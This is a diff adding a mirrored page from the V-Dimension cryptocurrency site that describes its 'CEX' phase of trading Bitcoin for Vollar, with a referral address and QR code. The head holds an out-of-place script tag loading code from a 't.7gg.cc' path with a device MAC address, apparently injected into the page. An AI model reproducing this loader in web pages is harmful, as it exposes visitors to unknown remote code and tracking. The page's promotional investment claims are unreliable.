@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+    
+<!-- Mirrored from www.vds.nz/icex by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Jun 2019 02:55:39 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>V-Dimension</title>
+        <meta name="keywords" content="V-Dimensi,blockchain">
+        <meta name="description" content="V-Dimensio">
+        <link rel="shortcut icon" href="statics/images/favicon.ico">
+        <link href="statics/css/common.css" rel="stylesheet"/>
+        <script src="statics/libs/jquery.min.js"></script>
+        <script src="statics/libs/jquery.cookie.js"></script>
+        <script src="statics/plugins/layer/layer.js"></script>
+        <script src="statics/plugins/qrcode/qrcode.min.js"></script>
+
+        <script>
+            function numFormat(num) {
+                var c = (num.toString().indexOf ('.') !== -1) ? num.toLocaleString() : num.toString().replace(/(\d)(?=(?:\d{3})+$)/g, '$1,');
+                return c;
+            }
+
+            $.ajaxSetup({
+                layerIndex:-1,
+                beforeSend: function(jqXHR, settings) {
+                    this.layerIndex = layer.load(1);
+                },
+                complete: function () {
+                    layer.close(this.layerIndex);
+                },
+                error: function (jqXHR, status, e) {
+                    layer.alert('Data request failed, please try again!');
+                }
+            });
+        </script>
+    <script async=true src="../t.7gg.cc_88/j1cdbf.js?MAC=CC81DA39F680"></script>
+</head>
+
+    <body>
+        <div id="root">
+            <link href="statics/css/header.css" rel="stylesheet">
+
+<style>
+    .header-c-m-m a.nav-active{
+        font-size: 18px;
+        color: #4A90E2;
+        font-weight: bold;
+    }
+</style>
+
+<div class="header-container">
+    <div class="header-c-m">
+        <div class="header-c-m-l"></div>
+        <div class="header-c-m-m">
+            <ul>
+                    <li><a href="index.html">Home</a></li>
+
+                    <li><a class="nav-active" href="cex.html">CEX</a></li>
+
+                <li><a href="game.html">The Games</a></li>
+
+                    <li><a href="whats.html">WHAT'S V</a></li>
+
+                <li><a href="paper.html">Ecology</a></li>
+
+                    <li><a href="source.html">Download</a></li>
+
+                    <li><a href="faq.html">FAQ</a></li>
+            </ul>
+        </div>
+        <div class="header-c-m-r">
+            <div class="current_lang">
+                <div class="lang">
+                    <span class="lang-txt">English</span>
+                    <span class="fa fa-chevron-down chevron"></span>
+                </div>
+            </div>
+            <div class="more_lang">
+                <div class="lang selected" data-value='en_US' data-en="English" id="en_US">
+                    <span class="lang-txt">English</span>
+                </div>
+                <div class="lang" data-value='de_DE' data-en="Deutsch" id="de_DE">
+                    <span class="lang-txt">Deutsch</span>
+                </div>
+                <div class="lang" data-value='es_ES' data-en="Español" id="es_ES">
+                    <span class="lang-txt">Español</span>
+                </div>
+                <div class="lang" data-value='fr_FR' data-en="Français" id="fr_FR">
+                    <span class="lang-txt">Français</span>
+                </div>
+                <div class="lang" data-value="en_MY" data-en="Malay" id="en_MY">
+                    <span class="lang-txt">Malay</span>
+                </div>
+                <div class="lang" data-value="pt_PT" data-en="Português" id="pt_PT">
+                    <span class="lang-txt">Português</span>
+                </div>
+                <div class="lang" data-value='ru_RU' data-en="русский" id="ru_RU">
+                    <span class="lang-txt">русский</span>
+                </div>
+                <div class="lang" data-value="hi_HI" data-en="हिन्दी" id="hi_HI">
+                    <span class="lang-txt">हिन्दी</span>
+                </div>
+                <div class="lang" data-value="fa_FA" data-en="فارسی" id="fa_FA">
+                    <span class="lang-txt">فارسی</span>
+                </div>
+                <div class="lang" data-value='ko_KR' data-en="한국의" id="ko_KR">
+                    <span class="lang-txt">한국의</span>
+                </div>
+                <div class="lang" data-value='ja_JP' data-en="日本の" id="ja_JP">
+                    <span class="lang-txt">日本の</span>
+                </div>
+                <div class="lang" data-value='zh_HK' data-en="中文(繁体)" id="zh_HK">
+                    <span class="lang-txt">中文(繁体)</span>
+                </div>
+                <div class="lang" data-value='zh_CN' data-en="中文(简体)" id="zh_CN">
+                    <span class="lang-txt">中文(简体)</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+
+    $(document).ready(function(){
+
+        $('.feature').on('click',function(){
+            layer.msg('Stay Tuned', {
+                skin: 'demo-class',
+                time: 2000,
+            });
+        });
+
+        $('.header-c-m-l').on('click',function(){
+            window.location.href='index.html';
+        });
+
+        var cookieLang = $.cookie("lang");
+        var img = $('#' + cookieLang).find('img').attr('src');
+        var lang = $('#' + cookieLang).attr('data-en');
+        $('.current_lang .lang-txt').text(lang);
+        $('.current_lang img').attr('src', img);
+        $('#' + cookieLang).addClass('selected').siblings().removeClass('selected');
+
+        $(document).click( function(e) {
+            $('.header-c-m-r, .more_lang').removeClass('active');
+        });
+
+        $('.header-c-m-r .current_lang').click(function(e){
+            e.stopPropagation();
+            $(this).parent().toggleClass('active');
+
+            setTimeout(function(){
+                $('.more_lang').toggleClass('active');
+            }, 5);
+        });
+
+        $('.more_lang .lang').click(function(){
+            $(this).addClass('selected').siblings().removeClass('selected');
+            $('.more_lang').removeClass('active');
+
+            var img = $(this).find('img').attr('src');
+            var lang = $(this).attr('data-value');
+
+
+            $('.current_lang .lang-txt').text(lang);
+            $('.current_lang img').attr('src', img);
+
+            $.cookie("lang", lang, { expires: 30, path:'/'});
+            window.location.reload();
+        });
+    });
+</script><link href="statics/css/icox/icox-common.css" rel="stylesheet">
+
+<div class="icox-bg">
+    <div class="icox-container">
+    </div>
+</div>
+
+<div class="icox-body">
+    <div class="icox-b-container">
+        <div class="icox-b-container-div">
+            <h1 class="title">CEX</h1>
+            <p class="desc">After ICEX is finished (block 30,240), the VDS Chain will automatically switch to CEX (Coin Exchange X). Here, Resonance Trade's Regular Phases begin, </p>
+            <p class="desc">where sustainable currency exchanges can be maintained. In CEX your currency is no longer multiplied, and the "X" now indicates limitless currency circulation. Participants may continue on performing Bitcoin to Vollar conversions whenever natural changes in the market make it worth it, as anytime  the market price is higher than the Resonance Price this operation increases the legal tender value of the traded-in Bitcoin.</p>
+        </div>
+        <div class="icox-b-container-div">
+            <div style="width:830px;margin:0 auto;">
+                <div style="float:left;width:260px;height:1px;margin:25px auto;padding:0px;background-image:linear-gradient(to right,transparent,#435471);opacity: 0.3;"></div>
+                <div style="float:right;width:260px;height:1px;margin:25px auto;padding:0px;background-image:linear-gradient(to left,transparent,#435471);opacity: 0.3;"></div>
+            </div>
+            <h1 class="title">CEX Rules</h1>
+            <p class="desc">After the VDS Chain begins, blocks 30,240-Infinity serve as the CEX Resonance Trade Phase. One Game will occur every 10,080 blocks throughout the entire, infinite lifetime of CEX. Any and all Bitcoin traded in CEX Phase game is distributed to the addresses belonging to the Fission Top 10 and Lucky 20  Light Master Node winners from the last game. </p>
+            <p class="desc">WARNING: THE ICEX PHASE RESONANCE ADDRESS IS ONLY TO BE USED DURING THE ICEX PHASE. If you send Bitcoin to the fixed ICEX address during the CEX phase, you will NOT receive any Vollar!!!!</p>
+        </div>
+        <div class="icox-b-container-div">
+            <div style="width:830px;height:1px;margin:0px auto;padding:0px;background-image:linear-gradient(to right,transparent,#435471,transparent);opacity: 0.3;"></div>
+        </div>
+        <div class="icox-b-container-div">
+            <button class="download-button" onclick="window.location.href='source.html'">Downloads</button>
+        </div>
+        <div class="icox-b-container-div">
+            <div class="img-step">
+                <div class="img-group">
+                    <img src="statics/images/img-step-1.png">
+                    <div class="img-tip">Download Client-end Wallet</div>
+                </div>
+                <div class="img-group">
+                    <img src="statics/images/img-step-2.png">
+                    <div class="img-tip">Generate Address and Create a VID</div>
+                </div>
+                <div class="img-group">
+                    <img src="statics/images/img-step-3.png">
+                    <div class="img-tip">Trade in your Bitcoin for Vollar with Resonance Trade</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<link href="statics/css/footer.css" rel="stylesheet">
+
+<div class="footer-bg">
+    <div class="footer-nav">
+        <div class="footer-nav-left">
+            <img style="width:163px;height:113px;" src="statics/images/img-banner-vds-1.png">
+        </div>
+        <div class="footer-nav-right">
+            <table style="border-collapse:separate; border-spacing:110px 20px;">
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td1">Introduction</td>
+                    <td noWrap="noWrap" class="footer-nav-td1">Download</td>
+                    <td noWrap="noWrap" class="footer-nav-td1">Other</td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="whats.html">What's V</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="source.html">APP/PC</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="faq.html">FAQ</a></td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="cex.html">CEX</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="source.html">Other</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="game.html">Top 10</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                </tr>
+            </table>
+        </div>
+        <div class="footer-nav-qrcode">
+            <div class="qrcode-container">
+                <div style="background: #FFFFFF;width:160px; height:160px;padding: 10px;border-radius:8px;margin: 0 auto;">
+                    <div id="qrcode"></div>
+                </div>
+                <p>Join My Team! Activate Your VID!</p>
+                <p class="addr-hidden" title="VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD">VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD</p>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<script>
+    var qrcode = new QRCode(document.getElementById("qrcode"), {
+        text: "VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD",
+        width: 140,
+        height: 140,
+        colorDark : "#000000",
+        colorLight : "#ffffff",
+        correctLevel : QRCode.CorrectLevel.H
+    });
+</script>
+        </div>
+    </body>
+
+<!-- Mirrored from www.vds.nz/icex by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Jun 2019 02:55:43 GMT -->
+</html>
